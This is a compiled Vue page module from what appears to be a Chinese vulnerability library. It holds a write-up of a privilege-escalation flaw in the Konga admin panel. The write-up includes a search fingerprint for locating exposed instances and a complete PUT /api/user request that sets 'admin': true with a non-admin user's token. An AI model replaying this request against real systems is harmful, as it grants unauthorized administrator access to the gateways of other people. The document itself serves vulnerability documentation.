import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{o as i,c as a,e as n}from"./app-58e4a7d6.js";const t={},d=n(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>Konga 普通用户通过发送特殊的请求可越权获取管理员权限</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>Konga
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&quot;konga&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>登录页面</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202101846658.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>创建非管理员用户后登录并获取token</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202101847245.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>发送请求包, 将token修改为刚刚获取的</p><div class="language-plain line-numbers-mode" data-ext="plain"><pre class="language-plain"><code>PUT /api/user/7 HTTP/1.1
Host: 127.0.0.1:1337
Accept: application/json, text/plain, */*
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/json;charset=utf-8
Content-Length: 241

{
  &quot;admin&quot;: true,
  &quot;passports&quot;: {
    &quot;password&quot;: &quot;1234abcd&quot;,
    &quot;protocol&quot;: &quot;local&quot;
  },
  &quot;password_confirmation&quot;: &quot;1234abcd&quot;,
  &quot;token&quot;: &quot;non-administrator user token&quot;
}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202101847809.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>成功转为管理员用户</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202101847129.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,16),s=[d];function o(l,r){return i(),a("div",null,s)}const p=e(t,[["render",o],["__file","Konga 普通用户越权获取管理员权限漏洞.html.vue"]]);export{p as default};
